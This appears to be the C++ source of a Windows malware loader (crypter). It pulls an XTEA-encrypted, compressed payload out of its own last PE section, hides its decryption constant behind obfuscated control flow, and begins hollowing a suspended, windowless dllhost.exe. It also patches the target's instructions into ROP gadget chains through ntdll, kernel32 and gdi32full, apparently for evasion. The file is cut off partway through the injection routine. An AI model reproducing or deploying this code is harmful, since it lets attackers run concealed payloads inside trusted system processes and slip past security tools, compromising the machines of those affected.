#include <stdio.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <zlib.h>
#include <tlhelp32.h>
#include <capstone/capstone.h>
#include <unordered_map>
#include <bits/stdc++.h>
#include <psapi.h>
#include <psdk_inc/intrin-impl.h>

typedef NTSTATUS (WINAPI *NtQueryInformationProcess_t)(
    HANDLE procHandle, 
    DWORD processInformationClass, 
    PVOID processInformation, 
    ULONG processInformationLength, 
    PULONG returnLength
);

typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(
    HANDLE procHandle,
    PVOID procImageBaseAddress
);

struct HiddenFile{
    BYTE* content;
    long size;
};

struct OffsetsRop{
    long offsetNtdll;
    long offsetKernel32;
    long offsetGdi32full;
};

struct MovMatch {
    BYTE* address;
    x86_reg reg; 
    uint64_t immediate;
    const char* registerName;
};

struct MovEncoding {
    uint8_t rex_prefix;  // 0 if not needed
    uint8_t opcode;
};

struct CallMatch {
    BYTE* instructionPtr;
    uint64_t targetAddress;
    uint64_t instructionAddress;
};

uint8_t get_register_index(unsigned int reg) {
    switch (reg) {
        case X86_REG_RAX: case X86_REG_EAX: return 0x0;
        case X86_REG_RCX: case X86_REG_ECX: return 0x1;
        case X86_REG_RDX: case X86_REG_EDX: return 0x2;
        case X86_REG_RBX: case X86_REG_EBX: return 0x3;
        case X86_REG_RSP: case X86_REG_ESP: return 0x4;
        case X86_REG_RBP: case X86_REG_EBP: return 0x5;
        case X86_REG_RSI: case X86_REG_ESI: return 0x6;
        case X86_REG_RDI: case X86_REG_EDI: return 0x7;
        case X86_REG_R8:  case X86_REG_R8D: return 0x0;
        case X86_REG_R9:  case X86_REG_R9D: return 0x1;
        case X86_REG_R10: case X86_REG_R10D: return 0x2;
        case X86_REG_R11: case X86_REG_R11D: return 0x3;
        case X86_REG_R12: case X86_REG_R12D: return 0x4;
        case X86_REG_R13: case X86_REG_R13D: return 0x5;
        case X86_REG_R14: case X86_REG_R14D: return 0x6;
        case X86_REG_R15: case X86_REG_R15D: return 0x7;
        default:
            printf("[!] Unsupported register!\n");
            return 0x10;
    }
}

MovEncoding get_mov_imm64_opcodeFromReg(x86_reg reg) {
    switch (reg) {
        case X86_REG_EAX: return {0x00, 0xB8};
        case X86_REG_ECX: return {0x00, 0xB9};
        case X86_REG_EDX: return {0x00, 0xBA};
        case X86_REG_EBX: return {0x00, 0xBB};
        case X86_REG_ESP: return {0x00, 0xBC};
        case X86_REG_EBP: return {0x00, 0xBD};
        case X86_REG_ESI: return {0x00, 0xBE};
        case X86_REG_EDI: return {0x00, 0xBF};

        case X86_REG_R8D: case X86_REG_R8:  return {0x49, 0xB8};
        case X86_REG_R9D: case X86_REG_R9:  return {0x49, 0xB9};
        case X86_REG_R10D: case X86_REG_R10: return {0x49, 0xBA};
        case X86_REG_R11D: case X86_REG_R11: return {0x49, 0xBB};
        case X86_REG_R12D: case X86_REG_R12: return {0x49, 0xBC};
        case X86_REG_R13D: case X86_REG_R13: return {0x49, 0xBD};
        case X86_REG_R14D: case X86_REG_R14: return {0x49, 0xBE};
        case X86_REG_R15D: case X86_REG_R15: return {0x49, 0xBF};

        default:
            printf("[!] Unsupported register for MOV reg, imm64 encoding!\n");
            return {0x10, 0x10};
    }
}

std::vector<MovMatch> findAll_mov_reg_imm32(BYTE* code, size_t size) {
    //first disassembly, then search for specific instructions

    csh handle;
    cs_insn* insn;
    size_t count;
    std::vector<MovMatch> matches;

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
        return matches;

    cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);

    count = cs_disasm(handle, code, size, 0x0, 0, &insn);
    if (count > 0) {
        for (size_t i = 0; i < count; i++) {
            cs_insn& instruction = insn[i];
            cs_detail* detail = instruction.detail;

            if (!detail)
                continue;

            if (instruction.id == X86_INS_MOV) {
                if (detail->x86.op_count == 2 && detail->x86.operands[0].type == X86_OP_REG && detail->x86.operands[1].type == X86_OP_IMM) {
                    x86_reg reg = detail->x86.operands[0].reg;
                    uint64_t imm = detail->x86.operands[1].imm;
                    if ((X86_REG_EAX <= reg && reg <= X86_REG_ESI) || (X86_REG_R8D <= reg && reg <= X86_REG_R15D)){//&& (imm <= 0xFFFFFFFF)){
                        printf("[!] Found MOV %s, 0x%llx at 0x%llx\n", cs_reg_name(handle, reg), imm, instruction.address);
                        size_t offset = instruction.address;
                    
                        matches.push_back({
                            code + offset,
                            reg,
                            imm,
                            cs_reg_name(handle, reg)
                        });
                    }

                }
            }
        }
        cs_free(insn, count);
    }
    cs_close(&handle);

    return matches;
}

BYTE* getGadgetAddress(OffsetsRop offsetRop){
    HMODULE hModule = NULL;
    if(offsetRop.offsetNtdll != -1){
        hModule = GetModuleHandleA("ntdll.dll");
        if (!hModule) {
            hModule = LoadLibraryA("ntdll.dll");
        }
        if (!hModule) {
            printf("[FAIL] Load ntdll.dll\n");
        }else{
            return (BYTE*)hModule + offsetRop.offsetNtdll;
        } 
    }
    if(offsetRop.offsetKernel32 != -1){
        hModule = GetModuleHandleA("kernel32.dll");
        if (!hModule) {
            hModule = LoadLibraryA("kernel32.dll");
        }
        if (!hModule) {
            printf("[FAIL] Load kernel32.dll\n");
        }else{
            return (BYTE*)hModule + offsetRop.offsetKernel32;
        } 
    }
    if(offsetRop.offsetGdi32full != -1){
        hModule = GetModuleHandleA("gdi32full.dll");
        if (!hModule) {
            hModule = LoadLibraryA("gdi32full.dll");
        }
        if (!hModule) {
            printf("[FAIL] Load gdi32full.dll\n");
        }else{
            return (BYTE*)hModule + offsetRop.offsetGdi32full;
        }
    }
    return NULL;
}

uInt replaceAll_mov_reg_imm32(BYTE* targetMemoryAddress, DWORD textSize, HANDLE hProcess, BYTE* ropMem, BOOL hasThirdDll) {
    
    std::unordered_map<x86_reg, OffsetsRop> popGadgets = {
        {X86_REG_EAX, {0x6794, 0xa5c2, 0x2a86d}},
        {X86_REG_EBX, {0x137d, 0x1398, 0x2cca}},
        {X86_REG_ECX, {0x1a853, 0x198bb, 0xa32c}},
        {X86_REG_EDX, {-1, -1, 0x1da90}},
        {X86_REG_EDI, {0x10df, 0x11a4, 0x11d5}},
        {X86_REG_ESI, {0x132d, 0x90ed, 0x1fb5}},
        {X86_REG_EBP, {0x11eb , -1, -1}},
        {X86_REG_R8, {0x7223, -1, 0x591b3}},
        {X86_REG_R8D, {0x7223, -1, 0x591b3}},
        {X86_REG_R9, {-1, -1, -1}},
        {X86_REG_R9D, {-1, -1, -1}},
        {X86_REG_R10, {-1, -1, -1}},
        {X86_REG_R10D, {-1, -1, -1}},
        {X86_REG_R11, {0x8cc28, -1, -1}},
        {X86_REG_R11D, {0x8cc28, -1, -1}},
        {X86_REG_R12, {0X1d93, 0x12487, 0x351b}},
        {X86_REG_R12D, {0X1d93, 0x12487, 0x351b}},
        {X86_REG_R13, {0X12d11, 0x6e8f, 0x2884a}},
        {X86_REG_R13D, {0X12d11, 0x6e8f, 0x2884a}},
        {X86_REG_R14, {0x2cb5, 0x90ec, 0x1fb4}},
        {X86_REG_R14D, {0x2cb5, 0x90ec, 0x1fb4}},
        {X86_REG_R15, {0x1102c, 0xf6cc, 0x2a84f}},
        {X86_REG_R15D, {0x1102c, 0xf6cc, 0x2a84f}},
    };
    
    if(!hasThirdDll){
        for(auto& [key, value] : popGadgets){
            value.offsetGdi32full = -1;
        }
    }

    BYTE* targetCodeBuffer = (BYTE*)malloc(textSize); //new BYTE[textSize];
    if (targetCodeBuffer == NULL) {
        printf("[FAIL] Allocate memory for target code buffer\n");
        return 0;
    }

    if (ReadProcessMemory(hProcess, targetMemoryAddress, targetCodeBuffer, textSize, NULL) == 0) {
        printf("[FAIL] Read target .text section\n");
        free(targetCodeBuffer);
        return 0;
    }

    printf("[SUCCESS] Read target .text section\n");

    auto matches = findAll_mov_reg_imm32(targetCodeBuffer, textSize);
    // matches.erase(matches.begin());
    printf("[!] Found %zu mov reg, imm32 instructions to patch\n", matches.size());
    if (matches.empty()) {
        free(targetCodeBuffer);
        return 0;
    }

    for (size_t idx = 0; idx < matches.size(); idx++) {
        
        void* POP_GADGET = getGadgetAddress(popGadgets[matches[idx].reg]);
        if(POP_GADGET == NULL){
            printf("[FAIL] Find POP gadgets: MOV %s, 0x%x\n", matches[idx].registerName, matches[idx].immediate);
            continue;
        }

        uintptr_t localOffset = matches[idx].address - targetCodeBuffer;
        BYTE* addressMOVinstr = targetMemoryAddress + localOffset;

        MovEncoding enc = get_mov_imm64_opcodeFromReg(matches[idx].reg);
        if(enc.opcode == 0x10 && enc.rex_prefix == 0x10){
            printf("[!] No opcode for register %s at address: 0x%p\n", matches[idx].registerName, addressMOVinstr);
            continue;
        }

        uint8_t registerId = get_register_index(matches[idx].reg);
        if(registerId == 0x10){
            printf("[!] No index for register %s at address 0x%p\n", matches[idx].registerName, addressMOVinstr);
            continue;
        }
        // printf("[!] Patching instruction at remote address 0x%p (offset 0x%zx)\n", addressMOVinstr, localOffset);

        // jmp rel32
        BYTE patchInstr[5] = { 0xE9 };
        int32_t offsetToNewInstruction = (int32_t)((ropMem + idx * 0x70) - (addressMOVinstr + 5));
        memcpy(patchInstr + 1, &offsetToNewInstruction, sizeof(offsetToNewInstruction));

        // overwrite the mov eax, 0 with JMP to ROP
        if (!WriteProcessMemory(hProcess, addressMOVinstr, patchInstr, sizeof(patchInstr), NULL)) {
            printf("[FAIL] Patch instruction at 0x%p\n", addressMOVinstr);
            free(targetCodeBuffer);
            return 0;
        }


        BYTE ropCode[100] = { 0 };
        BYTE* shell = ropCode ;

        // [0] save rsp to [oldRsp]
        shell[0] = 0x48; shell[1] = 0x89; shell[2] = 0x25; // mov [rip+imm32], rsp
        int32_t rel1 = (int32_t)((shell + 21) - (shell + 7)); // [oldRsp] - (next RIP)
        *(int32_t*)(shell + 3) = rel1;


        // [7] mov reg, imm64
        if(enc.rex_prefix){
            shell[7] = enc.rex_prefix;
        }else{
            shell[7] = 0x48;
        }
        shell[8] = enc.opcode;//reg;//shell[8] = 0xB8;
        uintptr_t ropChain = (uintptr_t)(ropMem + 0x70*idx + 0x40);
        *(uint64_t*)(shell + 9) = ropChain;
        // *(uint64_t*)(shell + 9) = (uint64_t)(shell + 0x40); // pointer to ROP chain

        bool isExtended = false;
        if( (X86_REG_R8 <= matches[idx].reg && matches[idx].reg <= X86_REG_R15) || 
            (X86_REG_R8D <= matches[idx].reg && matches[idx].reg <= X86_REG_R15D)){
            isExtended = true;
        }
        // [17] mov rsp, reg
        if (isExtended) {
            shell[17] = 0x48 | 0x04; // REX.W + B = 1 (register extension)
        } else {
            shell[17] = 0x48; // REX.W
        }
        shell[18] = 0x89;
        
        // uint8_t registerId = get_register_index(matches[idx].reg);
        // if(registerId == 0x10){
        //     printf("[!] No index for register %s at address 0x%p\n", matches[idx].registerName, addressMOVinstr);
        //     continue;
        // }

        shell[19] = 0xC0 | (registerId << 3) | 0x4;
        // [20] ret
        shell[20] = 0xC3;

        // [21] oldRsp storage (8 bytes)
        uint64_t* oldRspPtr = (uint64_t*)(shell + 21);
        *oldRspPtr = 0; // this will be modified at runtime

        // [29] mov rsp, [rip+imm32]
        BYTE* restoreRspInstr = shell + 29;
        restoreRspInstr[0] = 0x48; restoreRspInstr[1] = 0x8B; restoreRspInstr[2] = 0x25; 
        int32_t rel2 = (int32_t)((shell + 21) - (restoreRspInstr + 7));
        *(int32_t*)(restoreRspInstr + 3) = rel2;

        // [7] jmp addr_of_original_code
        restoreRspInstr[7] = 0xFF;
        restoreRspInstr[8] = 0x25;
        *(int32_t*)(restoreRspInstr + 9) = 0x0; // rel32=0, immediate next
        int x = 5; if(isExtended) x = 6;
        *(uint64_t*)(restoreRspInstr + 13) = (uint64_t)(addressMOVinstr + x); // this will be modified at runtime

        // [ROP chain starts at 0x40]
        void** rop_chain = (void**)(shell + 0x40);
        rop_chain[0] = POP_GADGET;
        rop_chain[1] = (void*)matches[idx].immediate;
        rop_chain[2] = (void*)(ropMem + 0x70 * idx + 29); // address of restore rsp instructions sequence

        // Write ROP code to remote memory
        if (!WriteProcessMemory(hProcess, ropMem + idx * 0x70, shell, 0x70, NULL)) {
            printf("[FAIL] Write ROP gadget at %p\n", ropMem + idx * 0x70);
            free(targetCodeBuffer);
            return 0;
        }
    }

    printf("[SUCCESS] Patched all instructions!\n");
    free(targetCodeBuffer);
    return matches.size();
}


std::vector<CallMatch> findAll_call_rel32(BYTE* code, size_t size) {
    csh handle;
    cs_insn* insn;
    size_t count;
    std::vector<CallMatch> matches;

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
        return matches;

    cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);

    count = cs_disasm(handle, code, size, 0x0, 0, &insn);
    if (count > 0) {
        for (size_t i = 0; i < count; i++) {
            cs_insn& instruction = insn[i];
            cs_detail* detail = instruction.detail;

            if (!detail)
                continue;

            if (instruction.id == X86_INS_CALL) {
                if (detail->x86.op_count == 1 && detail->x86.operands[0].type == X86_OP_IMM) {
                    uint64_t immTarget = detail->x86.operands[0].imm;

                    printf("[!] Found CALL 0x%llx at 0x%llx\n", immTarget, instruction.address);
                    
                    matches.push_back({
                        code + instruction.address,
                        immTarget,
                        instruction.address
                    });
                }
            }
        }
        cs_free(insn, count);
    }

    cs_close(&handle);
    return matches;
}

uInt replaceAll_call_rel32(BYTE* targetMemoryAddress, DWORD textSize, HANDLE hProcess, BYTE* ropMem){
    long popGadget = 0x137d;
    long pushGadgetNtdll = 0x615a9;

    // void* POP_GADGET = getGadgetAddress({0x137d, -1,-1});
    void* PUSH_GADGET = getGadgetAddress({pushGadgetNtdll, -1,-1});

    BYTE* targetCodeBuffer = (BYTE*)malloc(textSize);
    if (targetCodeBuffer == NULL) {
        printf("[FAIL] Allocate memory for target code buffer\n");
        return 0;
    }

    if (ReadProcessMemory(hProcess, targetMemoryAddress, targetCodeBuffer, textSize, NULL) == 0) {
        printf("[FAIL] Read target .text section\n");
        free(targetCodeBuffer);
        return 0;
    }

    printf("[SUCCESS] Read target .text section\n");

    auto matches = findAll_call_rel32(targetCodeBuffer, textSize);

    printf("[!] Found %zu call imm32 instructions to patch\n", matches.size());
    if (matches.empty()) {
        free(targetCodeBuffer);
        return 0;
    }

    for (size_t idx = 0; idx < matches.size(); idx++) {
        //24
        BYTE* addressCALLinstr = targetMemoryAddress + matches[idx].instructionAddress;

        BYTE patchInstr[5] = { 0xE9 };
        int32_t offsetToNewInstruction = (int32_t)((ropMem + idx * 0x60) - (addressCALLinstr + 5));
        memcpy(patchInstr + 1, &offsetToNewInstruction, sizeof(offsetToNewInstruction));

        // overwrite the mov eax, 0 with JMP to ROP
        if (!WriteProcessMemory(hProcess, addressCALLinstr, patchInstr, sizeof(patchInstr), NULL)) {
            printf("[FAIL] Patch instruction at 0x%p\n", addressCALLinstr);
            free(targetCodeBuffer);
            return 0;
        }
        
        uintptr_t dest = (uintptr_t)(targetMemoryAddress + matches[idx].targetAddress);  

        BYTE ropCode[96] = { 0 };
        BYTE* shell = ropCode;

        uintptr_t line_8  = (uintptr_t)(ropMem + idx * 0x60 + 53);  // [line 8]
        uintptr_t line_10 = (uintptr_t)(ropMem + idx * 0x60 + 58);  // [line 10]
        uintptr_t line_12 = (uintptr_t)(ropMem + idx * 0x60 + 79);  // [line 12]

        // 1. mov [line_12], rbx
        shell[0]  = 0x48; shell[1]  = 0x89; shell[2]  = 0x1D;
        *(int32_t*)(shell + 3) = (int32_t)(line_12 - ((uintptr_t)(ropMem + idx * 0x60 + 7)));

        // 2. mov rbx, line_10
        shell[7]  = 0x48; shell[8]  = 0xBB;
        *(uint64_t*)(shell + 9) = (uint64_t)line_10;

        // 3. push rbx
        shell[17] = 0x53;

        // 4. mov rbx, dest
        shell[18] = 0x48; shell[19] = 0xBB;
        *(uint64_t*)(shell + 20) = dest;

        // 5. push rbx
        shell[28] = 0x53;

        // 6. mov rbx, line_8
        shell[29] = 0x48; shell[30] = 0xBB;
        *(uint64_t*)(shell + 31) = line_8;

        // 7. jmp qword [rip + 0] → PUSH_GADGET
        shell[39] = 0xFF; shell[40] = 0x25; *(int32_t*)(shell + 41) = 0x0;
        *(uint64_t*)(shell + 45) = (uint64_t)PUSH_GADGET;

        // [48] line_8
        // 8. sub rsp, 3
        shell[53] = 0x48; shell[54] = 0x83; shell[55] = 0xEC; shell[56] = 0x03;

        // 9. ret
        shell[57] = 0xC3;

        // [53] line_10
        // 10. mov rbx, [line_12]
        shell[58] = 0x48; shell[59] = 0x8B; shell[60] = 0x1D;
        *(int32_t*)(shell + 61) = (int32_t)(line_12 - ((uintptr_t)(ropMem + idx * 0x60 + 65)));

        // 11. jmp address_of_next_instruction_after_call
        shell[65] = 0xFF; shell[66] = 0x25; *(int32_t*)(shell + 67) = 0x0;
        *(uint64_t*)(shell + 71) = (uint64_t)(addressCALLinstr + 5);

        // 12. rbx backup value stored here
        *(uint64_t*)(shell + 79) = 0; 

        // Final write
        if (!WriteProcessMemory(hProcess, ropMem + idx * 0x60, shell, sizeof(ropCode), NULL)) {
            printf("[FAIL] Write ROP gadget at %p\n", ropMem);
            free(targetCodeBuffer);
            return 0;
        }
    }
    printf("[SUCCESS] Patched all instructions!\n");
    free(targetCodeBuffer);
    return matches.size();
}


BYTE* findFreeMemory(HANDLE hProcess, BYTE* base, SIZE_T range = 0x70000000) {
    MEMORY_BASIC_INFORMATION memBasicInfo;
    uintptr_t start = (uintptr_t)base - range;
    uintptr_t end = (uintptr_t)base + range;

    for (uintptr_t addr = start; addr < end; addr += 0x1000) {
        if (VirtualQueryEx(hProcess, (LPCVOID)addr, &memBasicInfo, sizeof(memBasicInfo))) {
            if (memBasicInfo.State == MEM_FREE) {
                return (BYTE*)addr;
            }
        }
    }

    return NULL;
}

long getSizeOfFile(FILE* file){
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);
    return size;
}

bool decompress(BYTE* input, uInt inputSize, BYTE* output, uInt* outputSize){
    z_stream stream = {0};
    stream.next_in = input;
    stream.avail_in = inputSize;
    stream.next_out = output;
    stream.avail_out = *outputSize;
    int returnValue = inflateInit(&stream);
    if(returnValue != Z_OK){
        printf("[FAIL] Initiate decompress function\n");
        return false;
    }

    returnValue = inflate(&stream, Z_FINISH);
    if(returnValue != Z_STREAM_END){
        printf("[FAIL] Decompress function executed\n");
        return false;
    }

    inflateEnd(&stream);
    *outputSize = stream.total_out;
    return true;
}

uint32_t generateDelta(){
    int x = 3;
    uint32_t delta = 0xDEADBEEF;
    uint32_t aux1, aux2, aux3;
    for(int i=0; i<10; i++){
        switch (x)
        {
            case 0:
                aux3 = aux2 | 0xB9 & 0XFF;
                x = 7;
                break;
            case 1:
                aux1 = 0x37 << 16; 
                x = 9;
                break;
            case 2:
                delta = delta ^ 0XBAADF00D;
                x = 5;
                break;
            case 3:
                delta = 0x9E;
                x = 6;
                break;
            case 4:
                delta = delta | aux2;
                x = 8;
                break;
            case 5:
                delta = delta ^ 0XBAADF00D;
                break;
            case 6:
                delta = delta << 24;
                x = 1;
                break;
            case 7:
                delta = delta | aux1;
                x = 4;
                break;
            case 8:
                delta = delta | aux3;
                x = 2;
                break;
            case 9:
                aux2 = 0x79 << 8;
                x = 0;
                break;
            default:
                break;
        }
    }
    return delta;
}

void decrypt(uint32_t* encryptedtextBlock, uint32_t* key, uint32_t delta) {
    uint32_t half0 = encryptedtextBlock[0], half1 = encryptedtextBlock[1], numberOfRounds = 32;
    uint32_t sum = delta * numberOfRounds;
    for (uInt i = 0; i < numberOfRounds; ++i) {
        half1 -= (((half0 << 4) ^ (half0 >> 5)) + half0) ^ (sum + key[(sum >> 11) & 3]);
        sum -= delta;
        half0 -= (((half1 << 4) ^ (half1 >> 5)) + half1) ^ (sum + key[sum & 3]);
    }
    encryptedtextBlock[0] = half0; 
    encryptedtextBlock[1] = half1;
}

BYTE* decryptAll(BYTE* data, size_t size, uint32_t* key, size_t& outOriginalSize) {
    BYTE* decrypted = (BYTE*)malloc(size);
    if(decrypted == NULL){
        printf("[FAIL] Allocate memory for decrypted file\n");
        return NULL;
    }

    memcpy(decrypted, data, size);
    uint32_t delta = generateDelta();

    for (size_t i = 0; i < size; i += 8) {
        decrypt((uint32_t*)(decrypted + i), key, delta);
    }

    outOriginalSize = *(uint32_t*)decrypted;
    BYTE* result = (BYTE*)malloc(outOriginalSize);
    if(result == NULL){
        printf("[FAIL] Allocate memory for decrypted file\n");
        return NULL;
    }

    memcpy(result, decrypted + 4, outOriginalSize);
    free(decrypted);

    return result;
}

HiddenFile* findSection(char *fileName){
    FILE *packedFile = fopen(fileName, "rb");
    if(packedFile == NULL){
        printf("[FAIL] Open current file\n");
        return NULL;
    }

    IMAGE_DOS_HEADER dosHeader;
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - DOS Header\n");
        return NULL;
    }
    long fileHeaderOffset = dosHeader.e_lfanew;
    fseek(packedFile, fileHeaderOffset, SEEK_SET);

    IMAGE_NT_HEADERS fileHeader;
    fread(&fileHeader, sizeof(IMAGE_NT_HEADERS), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - NT Headers\n");
        return NULL;
    }
    int lastSectionIndex = fileHeader.FileHeader.NumberOfSections-1;
    fseek(packedFile, sizeof(IMAGE_SECTION_HEADER) * lastSectionIndex, SEEK_CUR);
    
    IMAGE_SECTION_HEADER lastSection;
    fread(&lastSection, sizeof(IMAGE_SECTION_HEADER), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section Header\n");
        return NULL;
    }

    int addressOfFile = lastSection.PointerToRawData;
    long sizeOfPackedFile = getSizeOfFile(packedFile);
    if(sizeOfPackedFile == -1){
        printf("[FAIL] Get size of current file\n");
        return NULL;
    }
    uint32_t paddingForOutput = sizeof(DWORD) + 4 * sizeof(uint32_t);

    long sizeOfEncryptedSection = sizeOfPackedFile - addressOfFile - paddingForOutput;

    DWORD originalFileSize;
    uint32_t key[4];

    //---------------------------

    BYTE* packedFileContent = (BYTE*)malloc(sizeOfEncryptedSection);
    if(packedFileContent == NULL){
        printf("[FAIL] Allocate memory for new file\n");
        return NULL;
    }

    uint32_t initialPaddingForOutput = sizeof(DWORD) + sizeof(key[0]);
    size_t middleKeyOffset = (sizeOfEncryptedSection - paddingForOutput) / 3;

    fseek(packedFile, addressOfFile, SEEK_SET);   
    fread(packedFileContent, paddingForOutput, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }

    fread(key, sizeof(key[0]), 1, packedFile);  
    fread(&originalFileSize, sizeof(DWORD), 1, packedFile);

    if(ferror(packedFile)){
        printf("[FAIL] Read current file\n");
        return NULL;
    }

    fread(packedFileContent + paddingForOutput, middleKeyOffset, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+1, sizeof(key[0]), 1, packedFile);

    fread(packedFileContent + paddingForOutput + middleKeyOffset, middleKeyOffset, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+2, sizeof(key[0]), 1, packedFile);
    size_t restOfFile = sizeOfEncryptedSection - paddingForOutput - 2*middleKeyOffset;

    fread(packedFileContent + paddingForOutput + 2*middleKeyOffset, restOfFile, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+3, sizeof(key[0]), 1, packedFile);
    
    size_t decryptedSize = 0;
    BYTE* decryptedFileContent = decryptAll(packedFileContent, sizeOfEncryptedSection, key, decryptedSize);
    if(decryptedFileContent == NULL){
        printf("[FAIL] Decryption of file\n");
        return NULL;
    }
    printf("[SUCCESS] Decryption of file\n");

    HiddenFile *hiddenFile = (HiddenFile *)malloc(sizeof(HiddenFile));
    if(hiddenFile == NULL){
        printf("[FAIL] Allocate memory for HiddenFile struct\n");
        return NULL;
    }
    hiddenFile->content = (BYTE*)malloc(originalFileSize);
    if(hiddenFile->content == NULL){
        printf("[FAIL] Allocate memory for content of HiddenFile struct\n");
        return NULL;
    }
    uInt *decompressedSize = (uInt*)malloc(sizeof(uInt));
    if(decompressedSize == NULL){
        printf("[FAIL] Allocate memory for decompressed file size\n");
        return NULL;
    }

    if(!decompress(decryptedFileContent, decryptedSize, hiddenFile->content, decompressedSize)){
        printf("[FAIL] Decompression of file\n");
        return NULL;
    }
    printf("[SUCCESS] Decompression of file\n");

    hiddenFile->size = *decompressedSize;

    HeapFree(GetProcessHeap(), 0, decompressedSize);
    HeapFree(GetProcessHeap(), 0, decryptedFileContent);
    HeapFree(GetProcessHeap(), 0, packedFileContent);
    fclose(packedFile);

    return hiddenFile;
}

void* convertRvaToPointer(DWORD rva, BYTE* fileBuffer, PIMAGE_SECTION_HEADER firstSection, WORD nrOfSections) {

    for (int i = 0; i < nrOfSections; i++) {
        DWORD sectionStart = firstSection->VirtualAddress;
        DWORD sectionSize = firstSection->Misc.VirtualSize;
        DWORD sectionEnd = sectionStart + sectionSize;

        // If the RVA falls within this section
        if (rva >= sectionStart && rva < sectionEnd) {
            DWORD offsetIntoSection = rva - sectionStart;
            DWORD fileOffset = firstSection->PointerToRawData + offsetIntoSection;
            return (void*)(fileBuffer + fileOffset);
        }
        firstSection++;
    }

    return NULL; // Not found
}

bool checkStaticImportedDLLs(BYTE* fileBuffer, PIMAGE_NT_HEADERS fileHeader, const char* dllToCheck) {

    IMAGE_DATA_DIRECTORY importDirectory = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDirectory.VirtualAddress == 0) {
        printf("[!] No imports found.\n");
        return false;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)convertRvaToPointer(importDirectory.VirtualAddress, fileBuffer, IMAGE_FIRST_SECTION(fileHeader), fileHeader->FileHeader.NumberOfSections);
    if (importDesc == NULL) {
        printf("[!] Invalid import descriptor pointer\n");
        return false;
    }

    while (importDesc->Name != 0) {
        const char* dllName = (const char*)convertRvaToPointer(importDesc->Name, fileBuffer, IMAGE_FIRST_SECTION(fileHeader), fileHeader->FileHeader.NumberOfSections);
        if (!dllName) break;
        if (strncmp(dllName, dllToCheck, strlen(dllName)) == 0){
            printf("[SUCCESS] Found %s for new instructions\n", dllName);
            return true;
        }
        importDesc++;
    }
    return false;
}

bool starting(char *fileName){
    
    if(fileName == NULL){
        printf("[FAIL] Invalid file name\n");
        return false;
    }

    HiddenFile* payloadFile = findSection(fileName);
    if(payloadFile == NULL){
        printf("[FAIL] Get hidden file\n");
        return false;
    }
    printf("[SUCCESS] Get hidden file\n");
    

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[FAIL] Load ntdll.dll\n");
        return false;
    }
    printf("[SUCCESS] Load ntdll.dll\n");
    

    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    memset(&startupInfo, 0, sizeof(STARTUPINFO));
    memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    if(!CreateProcessA("C:\\Windows\\system32\\dllhost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)){
        printf("[FAIL] Create process\n");
        return false;
    }
    printf("[SUCCESS] Create process - pid: %d | tid: %d\n", processInfo.dwProcessId, processInfo.dwThreadId);
    

    PROCESS_BASIC_INFORMATION procBasicInfo;
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if(NtQueryInformationProcess == NULL){
        printf("[FAIL] Get address of function\n");
        TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
        return false;
    }

    if(NtQueryInformationProcess(processInfo.hProcess, ProcessBasicInformation, &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL) != STATUS_SUCCESS){
        printf("[FAIL] Get process basic information\n");
        TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
        return false;
    }
    printf("[SUCCESS] Get process basic information\n");
    

    PVOID imageBaseAddressTarget;
    if(!ReadProcessMemory(processInfo.hProcess, ((BYTE*)procBasicInfo.PebBaseAddress + 0x10), &imageBaseAddressTarget, sizeof(PVOID), NULL)){
        printf("[FAIL] Get image base address of target process\n");
        TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
        return false;
    }
    printf("[SUCCESS] Get image base address of target process - image base address: %p\n", imageBaseAddressTarget);
    

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadFile->content;
    PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);

    BOOL unloadTargetCode = true;
    LPVOID startAllocatingAddress = NULL;

    if(unloadTargetCode){
        NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if(NtUnmapViewOfSection == NULL){
            printf("[FAIL] Get address of function\n");
            TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
            return false;
        }

        if(NtUnmapViewOfSection(processInfo.hProcess, imageBaseAddressTarget) != STATUS_SUCCESS){
            printf("[FAIL] Unload target process code section\n");
            TerminateProcess(processInfo.hProcess, EXIT_SUCCESS);
            return false;
        }
        printf("[SUCCESS] Unload target process code section\n");
        startAllocatingAddress = imageBaseAddressTarget;
    }

